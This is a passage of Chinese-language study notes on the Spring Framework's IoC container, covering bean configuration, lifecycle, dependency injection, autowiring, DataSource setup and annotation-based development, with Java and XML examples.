思想实现\n\n\nData Access：数据访问\n\n\nData Integration：数据集成\n\n\nWeb：Web 开发\n\n\nTest：单元测试与集成测试\n\n\n\n# 4.2 Spring Framework 学习线路\n\n# 5、Spring 核心概念\n# 4.1 IoC/DI 思想\n\n代码书写现状\n\n耦合度偏高\n\n\n解决方案\n\n使用对象时，在程序中不要主动使用 new 对象，转换为由外部提供对象\n\n\nIoC（Inversion of Control）控制反转\n\n使用对象时，由主动 new 产生对象转换为由外部提供对象，此过程中对象创建控制权由程序转移到外部，此思想称为控制反转\n\n\n\n# 4.2 IoC 容器\n\nSpring 技术对 IoC 思想进行了实现\n\nSpring 提供了一个容器，称为 IOC 容器，用来充当 IoC 思想的外部\nIOC 容器负责对象的创建、初始化等一系列工作，被创建或被管理的对象在 IoC 容器中统称为 Bean\n\n\n\n\n\n\nDI（Dependency Injection）依赖注入\n\n\n在容器中建立 bean 与 bean 之间的依赖关系的整个过程，称为依赖注入\n\n\n\n\n\n目标：充分解耦\n\n使用 IoC 容器管理 bean（IoC）\n在 IoC 容器内将有依赖关系的 bean 进行绑定（DI）\n\n\n\n最终效果\n\n使用对象时不仅可以直接从 IoC 容器中获取，并且获取到的 bean 已绑定了所有的依赖关系\n\n\n\n# 6、IoC 入门案例\n# 6.1 入门案例思路分析\n\n\n管理什么？\nService 与 Dao\n\n\n如何将被管理的对象告知 IoC 容器？（配置）\n\n\n被管理的对象交给 IoC 容器，如何获取到 IoC 容器？（接口）\n\n\nIoC 容器得到后，如何从容器中获取 bean？（接口方法）\n\n\n使用 Spring 导入哪些坐标？（pom.xml）\n\n\n# 6.2 入门案例实现\n1.导入maven坐标\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-context&lt;/artifactId>\n        &lt;version>5.2.10.RELEASE&lt;/version>\n    &lt;/dependency>\n    \n2.在resources目录下创建配置文件applicationContext.properties\n3.配置bean\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n&lt;!--1.导入Spring的坐标-->\n\n&lt;!--    2.配置bean-->\n&lt;!--    bean标签标示配置bean，id标示给bean起名字，class表示类名-->\n    &lt;bean id=\"bookDao\" class=\"com.itheima.dao.impl.BookDaoImpl\" />\n    &lt;bean id=\"bookService\" class=\"com.itheima.service.impl.BookServiceImpl\" />\n\n&lt;/beans>\n        \n        \n4.创建类写方法——先获取容器，再获取bean，然后调用bean的方法\npackage com.itheima;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.service.BookService;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\n\npublic class App2 &#123;\n    public static void main(String[] args) &#123;\n        //3.获取IoC容器\n        ApplicationContext ctx = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n        //4.获取bean\n        BookDao bookDao = (BookDao) ctx.getBean(\"bookDao\");\n        bookDao.save();\n\n        BookService bookService = (BookService) ctx.getBean(\"bookService\");\n        bookService.save();\n    &#125;\n&#125;\n\n\n注意事项：bean 定义时 id 属性在同一个上下文中不可重复\n\n# 7、DI 入门案例\n# 7.1 入门案例思路分析\n\n基于 IoC 管理 bean\nService 中使用 new 形式创建的 Dao 对象能否保留？（否）\nService 中需要的 Dao 对象如何进入到 Service 中？（提供方法）\nService 与 Dao 之间的关系如何描述？（配置）\n\n# 7.2 入门案例实现\n\n\n删除使用 new 的形式创建对象的代码\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.service.BookService;\n\npublic class BookServiceImpl implements BookService &#123;\n    //5.删除业务层中shiyongnew的\n    private BookDao bookDao;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book service save......\");\n        bookDao.save();\n    &#125;\n&#125;\n\n\n提供依赖对象对应的 setter 方法\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.service.BookService;\n\npublic class BookServiceImpl implements BookService &#123;\n    //5.删除业务层中shiyongnew的\n    private BookDao bookDao;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book service save......\");\n        bookDao.save();\n    &#125;\n\n    //6.提供对应的set方法,这个set方法是容器在执行\n    public void setBookDao(BookDao bookDao) &#123;\n        this.bookDao = bookDao;\n    &#125;\n&#125;\n\n\n配置 service 与 dao 之间的关系\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n&lt;!--1.导入Spring的坐标-->\n\n&lt;!--    2.配置bean-->\n&lt;!--    bean标签标示配置bean，id标示给bean起名字，class表示类名-->\n    &lt;bean id=\"bookDao\" class=\"com.itheima.dao.impl.BookDaoImpl\" />\n    &lt;bean id=\"bookService\" class=\"com.itheima.service.impl.BookServiceImpl\">\n&lt;!--        7.配置Dao与Service的关系 //这里是bookService调用bookDao，所以在service标签里配置Dao-->\n&lt;!--        property标示配置当前bean的属性-->\n&lt;!--        name属性表示配置哪一个具体的属性-->\n&lt;!--        ref表示参照哪一个bean-->\n        &lt;property name=\"bookDao\" ref=\"bookDao\">&lt;/property>\n    &lt;/bean>\n    \n&lt;/beans>\n\n\n# 8、bean 配置\n# 8.1 基本配置\n\n# 8.2 bean 别名配置\n\n\n注意事项：获取 bean 无论是通过 id 还是 name 获取，如果无法获取到，将抛出异常 NoSuchBeanDefinitionException:No bean named ‘service4’ available\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    &lt;bean id=\"bookDao\" name=\"dao\" class=\"com.itheima.dao.impl.BookDaoImpl\" />\n    &lt;bean id=\"bookService\" name=\"service service2 bookEbi\" class=\"com.itheima.service.impl.BookServiceImpl\">\n        &lt;property name=\"bookDao\" ref=\"bookDao\">&lt;/property>\n    &lt;/bean>\n\n&lt;/beans>\n==bean在配置了name别名之后，可以使用别名获取对象，也可以使用别名作为ref的值==\n\n# 8.3 bean 作用范围配置\n\n\n\n为什么 bean 默认为单例？\n防止造出的 bean 数量过于庞大，造成较高负载；管理复用的对象，使用完毕后放回容器，下次使用再从容器中拿。\n\n\n适合交给容器进行管理的 bean\n\n表现层对象\n业务层对象\n数据层对象\n工具对象\n\n\n\n不适合交给容器进行管理的 bean\n\n封装实体的域对象\n\n\n\n# 9、bean 实例化\n# 9.1 bean 是如何创建出来的\n\n本质上是对象，创建 bean 使用构造方法完成\n\n# 9.2 实例化 bean 的三种方式\n# 9.2.1 构造方法（常用）\n\n\n提供可访问的构造方法\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.service.BookService;\n\npublic class BookServiceImpl implements BookService &#123;\n    //5.删除业务层中shiyongnew的\n    private BookDao bookDao;\n\n    public BookServiceImpl() &#123;\n        System.out.println(\"service constructor is running ....\");\n    &#125;\n&#125;\n\n\n配置\n&lt;bean id=\"bookDao\" name=\"dao\" class=\"com.itheima.dao.impl.BookDaoImpl\" scope=\"prototype\" />\n\n\n无参构造方法如果不存在，将抛出异常 BeanCreationException\n\n\n# 9.2.2 静态工厂（了解）\n\n\n为兼容早期遗留问题使用\n\n\n静态工厂\npackage com.itheima.factory;\n\nimport com.itheima.dao.OrderDao;\nimport com.itheima.dao.impl.OrderDaoImpl;\n\npublic class OrderDaoFactory &#123;\n    public static OrderDao getOrderDao() &#123;\n        return new OrderDaoImpl();\n    &#125;\n&#125;\n\n\n配置\n&lt;bean \n      id=\"orderDao\" \n      class=\"com.itheima.factory.OrderDaoFactory\" \n      factory-method=\"getOrderDao\" \n      />\nclass：工厂类名\nfactory-method：工厂类中获取实例的方法名\n\n\n# 9.2.3 实例工厂（了解）\n\n\n实例工厂\npackage com.itheima.factory;\n\nimport com.itheima.dao.UserDao;\nimport com.itheima.dao.impl.UserDaoImpl;\n\npublic class UserDaoFactory &#123;\n    public UserDao getUserDao()&#123;\n        return new UserDaoImpl();\n    &#125;\n&#125;\n\n\n配置\n&lt;bean id=\"userFactory\" class=\"com.itheima.factory.UserDaoFactory\" />\n&lt;bean \n      id=\"userDao\" \n      factory-bean=\"userFactory\" //指向工厂的bean\n      factory-method=\"getUserDao\" \n      />\n\n\n# 9.2.4 FactoryBean（实用）\n\n\nFactoryBean\npackage com.itheima.factory;\n\nimport com.itheima.dao.UserDao;\nimport com.itheima.dao.impl.UserDaoImpl;\nimport org.springframework.beans.factory.FactoryBean;\n\npublic class UserDaoFactoryBean implements FactoryBean&lt;UserDao> &#123;\n    //代替原始实例工厂中创建对象的方法\n    @Override\n    public UserDao getObject() throws Exception &#123;\n        return new UserDaoImpl();\n    &#125;\n\n    @Override\n    public Class&lt;?> getObjectType() &#123;\n        return UserDao.class;\n    &#125;\n\n    //单例多例\n    @Override\n    public boolean isSingleton() &#123;\n        return false;//非单例\n        //return true 单例\n    &#125;\n&#125;\n\n\n配置\n&lt;bean \n      id=\"userDao\" \n      class=\"com.itheima.factory.UserDaoFactoryBean\" \n      />\n\n\n# 10、bean 的生命周期\n\n生命周期：从创建到消亡的完整过程\nbean 生命周期：bean 从创建到销毁的整体过程\nbean 生命周期控制：在 bean 创建后到销毁前做的事情\n\n# 10.1 配置控制\n\n\n提供生命周期控制方法\npackage com.itheima.dao.impl;\n\nimport com.itheima.dao.BookDao;\n\npublic class BookDaoImpl implements BookDao &#123;\n    @Override\n    public void save() &#123;\n        System.out.println(\"book save dao ....\");\n    &#125;\n\n    public void init() &#123; //方法名不要带参数\n        System.out.println(\"dao init ....\");\n    &#125;\n\n    public void destroy() &#123;\t//方法名不要带参数\n        System.out.println(\"dao destory ....\");\n    &#125;\n&#125;\n\n\n配置生命周期方法\n&lt;bean \n      id=\"bookDao\" \n      class=\"com.itheima.dao.impl.BookDaoImpl\" \n      init-method=\"init\" \n      destroy-method=\"destroy\"\n      />\n\n\n# 10.2 接口控制（了解）\n\n\n实现 InitializingBean, DisposableBean 接口\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.service.BookService;\nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.beans.factory.InitializingBean;\n\npublic class BookServiceImpl implements BookService, InitializingBean, DisposableBean &#123;\n\n    public BookDao bookDao;\n\n    @Override\n    public void save() &#123;\n        bookDao.save();\n    &#125;\n\n    public void setBookDao(BookDao bookDao) &#123;\n        this.bookDao = bookDao;\n    &#125;\n\n    @Override\n    public void destroy() throws Exception &#123;\n        System.out.println(\"service destroy ....\");\n    &#125;\n\n    @Override\n    public void afterPropertiesSet() throws Exception &#123; //构造方法属性设置完以后才执行\n        System.out.println(\"service init ....\");\n    &#125;\n&#125;\n\n\n配置生命周期方法\n&lt;bean \n      id=\"bookService\" \n      class=\"com.itheima.service.impl.BookServiceImpl\" \n      />\n\n\n# 10.3 生命周期\n\n初始化容器\n\n创建对象（内存分配）\n执行构造方法\n执行属性注入（set 操作）\n执行 bean 初始化方法\n\n\n使用 bean\n\n执行业务操作\n\n\n关闭 / 销毁容器\n\n执行 bean 销毁方法\n\n\n\n# 10.4 bean 销毁时机\n\n\n容器关闭前出发 bean 的销毁\n\n\n关闭容器方式：\n\n\n手工关闭容器：\n\n  - 注册关闭勾子，在虚拟机退出前先关闭容器再退出虚拟机\n\n    &#96;&#96;&#96;ConfigurableApplicationContext&#96;&#96;&#96;接口&#96;&#96;&#96;registerShutdownHook()&#96;&#96;&#96;操作\n\n&#96;&#96;&#96;java\npublic class AppForLifeCycle &#123;\n    public static void main(String[] args) &#123;\n        ClassPathXmlApplicationContext ctx &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.properties.xml&quot;);\n        ctx.close();\n    &#125;\n&#125;\n\n\n\n\n# 11、依赖注入方式\n\n思考：向一个类中传递数据的方式有几种？\n\n普通方法（set 方法）\n构造方法\n\n\n思考：依赖注入描述了在容器中建立 bean 与 bean 之间依赖关系的过程，如果 bean 运行需要的是数字或字符串呢\n\n引用类型\n简单类型（基本数据类型与 string）\n\n\n依赖注入方式\n\nsetter 注入\n\n简单类型\n引用类型\n\n\n构造器注入\n\n简单类型\n引用类型\n\n\n\n\n\n# 11.1 setter 注入 —— 引用类型\n使用 property 标签\n\n多个引用类型注入\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" scope=\"singleton\" init-method=\"init\" destroy-method=\"destroy\" />\n&lt;bean class=\"com.itheima.dao.impl.UserDaoImpl\" id=\"userDao\" />\n&lt;bean class=\"com.itheima.service.impl.BookServiceImpl\" id=\"bookService\">\n    &lt;property name=\"bookDao\" ref=\"bookDao\"/>\n    &lt;property name=\"userDao\" ref=\"userDao\" />\n&lt;/bean>\n需要类里有两个对象和两个setter方法\n# 11.2 setter 注入 —— 基本类型\n使用 property 标签\n\n基本类型注入\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImp\" id=\"bookDao\">\n    &lt;property name=\"databaseName\" value=\"mysql\" />\n    &lt;property name=\"connectionNum\" value=\"22\"/>\n&lt;/bean>\n    \n需要类里有setter方法\npackage com.itheima.dao.impl;\n\nimport com.itheima.dao.BookDao;\n\npublic class BookDaoImp implements BookDao &#123;\n\n    private int connectionNum;\n    private String databaseName;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book dao save .....\" + \"\\ndatabaseName:\" +databaseName + \"\\nconnectionNum:\" +connectionNum);\n    &#125;\n\n    public void setConnectionNum(int connectionNum) &#123;\n        this.connectionNum = connectionNum;\n    &#125;\n\n    public void setDatabaseName(String databaseName) &#123;\n        this.databaseName = databaseName;\n    &#125;\n&#125;\n# 11.3 构造器注入 —— 引用类型\n使用 constructor-arg 标签\n\n构造器注入引用类型对象\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" name=\"dao book\" />\n&lt;bean class=\"com.itheima.dao.impl.UserDaoImpl\" id=\"userDao\" />\n&lt;bean class=\"com.itheima.service.impl.BookServiceImpl\" id=\"bookService\" >\n    &lt;constructor-arg name=\"bookDao\" ref=\"bookDao\"/>\n    &lt;constructor-arg name=\"userDao\" ref=\"userDao\"/>\n&lt;/bean>\n注意这里的name指的是构造方法里的形参名，ref指的是前面bean给的ID名\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.dao.UserDao;\nimport com.itheima.service.BookService;\n\npublic class BookServiceImpl implements BookService &#123;\n\n    private BookDao bookDao;\n    private UserDao userDao;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book service save ......\");\n        bookDao.save();\n        userDao.save();\n    &#125;\n\n    public BookServiceImpl(BookDao bookDao, UserDao userDao) &#123;\n        this.bookDao = bookDao;\n        this.userDao = userDao;\n    &#125;\n&#125;\n# 11.4 构造器注入 —— 简单类型\n使用 constructor-arg 标签\n\n构造器注入简单类型对象\n这种方式因为配置文件里需要写构造方法的参数名，耦合度还是很高\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" name=\"dao book\">\n    &lt;constructor-arg name=\"databaseName\" value=\"mysql\" />\n    &lt;constructor-arg name=\"connectionCount\" value=\"10\" />\n&lt;/bean>\n注意写的时候要注意写的顺序必须和构造方法参数的位置一样\npackage com.itheima.dao.impl;\n\nimport com.itheima.dao.BookDao;\n\npublic class BookDaoImpl implements BookDao &#123;\n\n    private String databaseName;\n    private int connectionCount;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book dao save ......\" + databaseName + \",\" + connectionCount);\n    &#125;\n\n    public BookDaoImpl(String databaseName, int connectionCount) &#123;\n        this.databaseName = databaseName;\n        this.connectionCount = connectionCount;\n    &#125;\n&#125;\n\n解耦合 1：使用 type\n\n解决形参名称问题\n这种方法在有两个或以上同类型的参数时不能使用\n\n\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" name=\"dao book\">\n    &lt;constructor-arg type=\"java.lang.String\" value=\"mysql\" />\n    &lt;constructor-arg type=\"int\" value=\"10\" />\n&lt;/bean>\n\n解耦合 2：使用 index\n\n使用位置解决参数类型重复问题\n\n\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" name=\"dao book\">\n    &lt;constructor-arg index=\"0\" value=\"mysql\" />\n    &lt;constructor-arg index=\"1\" value=\"10\" />\n&lt;/bean>\n# 11.5 依赖注入方式选择\n\n强制依赖使用构造器进行，使用 setter 注入有概率不进行注入导致 null 对象出现\n可选依赖使用 setter 注入进行，灵活性强\nSpring 框架倡导使用构造器，第三方框架内部大多数采用构造器注入的形式进行数据初始化，相对严谨\n如果有必要可以两者同时使用，使用构造器注入完成强制依赖注入，使用 setter 注入完成可选依赖的注入\n实际开发过程中还要根据实际情况分析，如果受控对象没有提供 setter 方法就必须使用构造器注入\n自己开发的模块推荐使用 setter 注入\n\n# 12、依赖自动装配\n\nIoC 容器根据 bean 所依赖的资源在容器中自动查找并注入到 bean 中的过程称为自动装配\n自动装配方式\n\n按类型（常用）\n按名称\n按构造方法\n不启用自动装配\n\n\n\n# 12.1 按类型自动装配\n\n类中的 setter 方法要保留\n在 bean 标签中加一属性：audowire=“byYype”\n装配时要先将类写到 bean 配置，且相同类型只能有一个 bean\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" />\n&lt;bean class=\"com.itheima.service.impl.BookServiceImpl\" id=\"bookService\" autowire=\"byType\" />\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.service.BookService;\n\npublic class BookServiceImpl implements BookService &#123;\n\n    private BookDao bookDao;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book service save ...\");\n        bookDao.save();\n    &#125;\n\n    public void setBookDao(BookDao bookDao) &#123;\n        this.bookDao = bookDao;\n    &#125;\n&#125;\n# 12.2 按名称自动装配\n\nsetter 的变量名和 bean 标签的 id 匹配\n\n&lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\" />\n&lt;bean class=\"com.itheima.service.impl.BookServiceImpl\" id=\"bookService\" autowire=\"byName\" />\n# 12.3 依赖自动装配特征\n\n自动装配用于引用类型依赖注入，不能对简单类型进行操作\n使用按类型装配时 (byType) 必须保障容器中相同类型的 bean 唯一，推荐使用\n使用按名称装配时 (byName) 必须保障容器中具有指定名称的 bean，因变量名与配置耦合，不推荐使用\n自动装配的优先级低于 setter 注入与构造器注入，同时出现时自动装配配置失败\n\n# 13、集合注入\npackage com.itheima.dao.impl;\n\nimport com.itheima.dao.BookDao;\n\nimport java.util.*;\n\npublic class BookDaoImpl implements BookDao &#123;\n\n    private int[] array;\n    private List&lt;String> list;\n    private Set&lt;String> set;\n    private Map&lt;String,String> map;\n    private Properties properties;\n\n    public void setArray(int[] array) &#123;\n        this.array = array;\n    &#125;\n\n    public void setList(List&lt;String> list) &#123;\n        this.list = list;\n    &#125;\n\n    public void setSet(Set&lt;String> set) &#123;\n        this.set = set;\n    &#125;\n\n    public void setMap(Map&lt;String, String> map) &#123;\n        this.map = map;\n    &#125;\n\n    public void setProperties(Properties properties) &#123;\n        this.properties = properties;\n    &#125;\n\n    @Override\n    public void save() &#123;\n        System.out.println(\"book dao save ...\");\n\n        System.out.println(\"遍历数组\" + Arrays.toString(array));\n\n        System.out.println(\"遍历List\" + list);\n\n        System.out.println(\"遍历Set\" + set);\n\n        System.out.println(\"遍历Map\" + map);\n\n        System.out.println(\"遍历Properties\" + properties);\n    &#125;\n&#125;\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    &lt;bean class=\"com.itheima.dao.impl.BookDaoImpl\" id=\"bookDao\">\n        &lt;property name=\"array\">\n            &lt;array>\n                &lt;value>100&lt;/value>\n                &lt;value>200&lt;/value>\n                &lt;value>300&lt;/value>\n                &lt;ref bean=\"beanID\" />\n            &lt;/array>\n        &lt;/property>\n        &lt;property name=\"list\">\n            &lt;list>\n                &lt;value>itcast&lt;/value>\n                &lt;value>itheima&lt;/value>\n                &lt;value>boxuegu&lt;/value>\n            &lt;/list>\n        &lt;/property>\n        &lt;property name=\"set\">\n            &lt;set>\n                &lt;value>itcast&lt;/value>\n                &lt;value>itheima&lt;/value>\n                &lt;value>boxuegu&lt;/value>\n                &lt;value>boxuegu&lt;/value>\n            &lt;/set>\n        &lt;/property>\n        &lt;property name=\"map\">\n            &lt;map>\n                &lt;entry key=\"country\" value=\"china\"/>\n                &lt;entry key=\"name\" value=\"ZhangSan\"/>\n                &lt;entry key=\"addr\" value=\"Qingdao\"/>\n            &lt;/map>\n        &lt;/property>\n        &lt;property name=\"properties\">\n            &lt;props>\n                &lt;prop key=\"country\">china&lt;/prop>\n                &lt;prop key=\"name\">ZhangSan&lt;/prop>\n                &lt;prop key=\"age\">15&lt;/prop>\n            &lt;/props>\n        &lt;/property>\n    &lt;/bean>\n\n&lt;/beans>\n# 14、案例：数据源对象管理\n# 14.1 Druid\n&lt;bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\" >\n    &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\" />\n    &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/spring_db\" />\n    &lt;property name=\"username\" value=\"root\" />\n    &lt;property name=\"password\" value=\"root\" />\n&lt;/bean>\npackage com.itheima;\n\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\n\nimport javax.sql.DataSource;\n\npublic class App &#123;\n    public static void main(String[] args) &#123;\n        ClassPathXmlApplicationContext classPathXmlApplicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n        DataSource dataSource = (DataSource) classPathXmlApplicationContext.getBean(\"dataSource\");\n        System.out.println(dataSource);\n    &#125;\n&#125;\n# 14.2 c3p0\n&lt;bean class=\"com.mchange.v2.c3p0.ComboPooledDataSource\" id=\"dataSource\" >\n    &lt;property name=\"driverClass\" value=\"com.mysql.jdbc.Driver\"/>\n    &lt;property name=\"jdbcUrl\" value=\"jdbc:mysql://localhost:3306/spring_db\"/>\n    &lt;property name=\"user\" value=\"root\"/>\n    &lt;property name=\"password\" value=\"root\"/>\n&lt;/bean>\n\n在使用第三方资源时，使用构造器还是 setter 注入要去看这个类提供的方法\n\n# 15、加载 properties 文件\n\n\n开启新的 context 命名空间\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"\n       http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context\n       http://www.springframework.org/schema/context/spring-context.xsd\">\n&lt;/beans>\n\n\n\n使用 context 命名空间，加载指定 properties 文件\n&lt;context:property-placeholder location=\"jdbc.properties\" system-properties-mode=\"NEVER\"/>\nsystem-properties-mode=\"NEVER\"：不加载系统属性\n加载多个文件可以使用*.properties 或者用逗号隔开\n标准写法：location=\"classpath:*.properties\"\nlocation=\"classpath*:*.properties\" 表示不仅可以从当前工程文件读，也可以读导入的jar包中的配置文件\n\n\n使用 ${} 读取加载的属性值\n&lt;bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\" >\n    &lt;property name=\"driverClassName\" value=\"$&#123;jdbc.driver&#125;\" />\n    &lt;property name=\"url\" value=\"$&#123;jdbc.url&#125;\" />\n    &lt;property name=\"username\" value=\"$&#123;jdbc.username&#125;\" />\n    &lt;property name=\"password\" value=\"$&#123;jdbc.password&#125;\" />\n&lt;/bean>\n\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"\n       http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context\n       http://www.springframework.org/schema/context/spring-context.xsd\">\n\n&lt;!--    1.开启context命名空间-->\n&lt;!--    2.使用context空间加载properties文件-->\n    &lt;context:property-placeholder location=\"jdbc.properties\"/>\n\n\n    &lt;bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\" >\n        &lt;property name=\"driverClassName\" value=\"$&#123;jdbc.driver&#125;\" />\n        &lt;property name=\"url\" value=\"$&#123;jdbc.url&#125;\" />\n        &lt;property name=\"username\" value=\"$&#123;jdbc.username&#125;\" />\n        &lt;property name=\"password\" value=\"$&#123;jdbc.password&#125;\" />\n    &lt;/bean>\n\n&lt;/beans>\n# 16、容器\n# 16.1 创建容器的两种方法\n\n方法一：类路径加载配置文件\n\nClassPathXmlApplicationContext ctx1 = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n\n方法二：文件路径加载配置文件\n\nApplicationContext ctx2 = new FileSystemXmlApplicationContext(\"E:\\\\Code\\\\java\\\\spring_study\\\\src\\\\main\\\\resources\\\\applicationContext.xml\");\n\n加载多个配置文件\n\nClassPathXmlApplicationContext ctx1 = new ClassPathXmlApplicationContext(\"applicationContext.xml\", \"bean2.xml\");\n# 16.2 容器类层次结构图\n\n# 16.3 获取 bean 的三种方法\n\n直接获取后强转\n\nBookDao bookDao = (BookDao) ctx1.getBean(\"bookDao\");\n\n在获取时传参指定对象类型\n\nBookDao bookDao1 = ctx1.getBean(\"bookDao\",BookDao.class);\n\n自动获取（bean 要唯一）\n\nBookDao bookDao2 = ctx1.getBean(BookDao.class);\n# 17、核心容器总结\n\nBeanFactory 是 IoC 容器的顶层接口，初始化 BeanFactory 对象时，加载的 bean 延迟加载\nApplicationContext 接口是 Spring 容器的核心接口，初始化 bean 时立即加载，想延迟加载，bean 标签加参数 lazy-init=“true”\nApplicationContext 接口提供基础的 bean 操作相关方法，通过其他接口扩展其功能\nApplicationContext 接口常用初始化类\n\nClassPathXmlApplicationContext\nFileSystemXmlApplicationContext\n\n\nbean 相关\n\n\n\n依赖注入相关\n\n\n# 18、注解开发定义 bean\n# 18.1 注解开发定义 bean\n\n使用 @Component 定义 bean\n\n@Component(\"bookDao\") //获取bean时使用类名获取\npublic class BookDaoImpl implements BookDao &#123;\n&#125;\n\n@Component //获取bean的时候使用类.class获取\npublic class BookServiceImpl implements BookService &#123;\n&#125;\n\n核心配置文件中通过组件扫描加载 bean   要添加 context 命名空间\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"\n       http://www.springframework.org/schema/beans \n       http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context \n       http://www.springframework.org/schema/context/spring-context.xsd\">\n\n    &lt;context:component-scan base-package=\"com.itheima.dao.impl\" />\n    &lt;context:component-scan base-package=\"com.itheima.service.impl\" />\n\n&lt;/beans>\n\nSpring 提供了三个衍生注解 @Service，@Repository，@Controller\n\n@Repository 数据层\n@Service 服务层\n@Controller 表现层\n\n\n\n# 18.2 纯注解开发\n\nSpring3.0 开启了纯注解的开发模式，使用 Java 类替代配置文件，开启了 Spring 快速开发通道\nJava 类替代 Spring 核心配置文件\n\n@Configuration\n@ComponentScan(\"com.itheima\")\npublic class SpringConfig &#123;\n\n&#125;\npublic class AppForAnnotation &#123;\n    public static void main(String[] args) &#123;\n        ApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class); //注意使用的类名\n        BookDao bookDao = ctx.getBean(\"bookDao\", BookDao.class);\n        bookDao.save();\n    &#125;\n&#125;\n\n@Configuration 注解用于设定当前类为配置类\n@ComponentScan 注解用于设定扫描路径，此注解只能添加一次，多个数据请用数组格式\n\n@ComponentScan(&#123;\"com.itheima.service\", \"com.itheima.dao\"&#125;)\n\n容器对象获取也需要更换类\n\nApplicationContext ctx &#x3D; new AnnotationConfigApplicationContext(SpringConfig.class); \n# 19、注解开发 bean 管理\n# 19.1 作用范围\n\n在类定义前使用注解指定作用范围\n\nsingleton 单例\nprototype 多例\n\n\n\n@Component(\"bookDao\")\n@Scope(\"singleton\")\n//singleton单例\n//prototype多例\npublic class BookDaoImpl implements BookDao &#123;\n&#125;\n# 19.2 生命周期\n\n使用 @PostConstruct（初始化）和 @PreDestroy（销毁）注解写在方法前定义初始化和销毁方法\n\n@Component(\"bookDao\")\n@Scope(\"singleton\")\npublic class BookDaoImpl implements BookDao &#123;\n    @Override\n    public void save() &#123;\n        System.out.println(\"book dao save ......\");\n    &#125;\n\n    @PostConstruct\n    public void init() &#123;\n        System.out.println(\"init\");\n    &#125;\n\n    @PreDestroy\n    public void destroy() &#123;\n        System.out.println(\"destroy\");\n    &#125;\n&#125;\n# 20、注解开发依赖注入\n# 20.1 自动装配\n\n使用 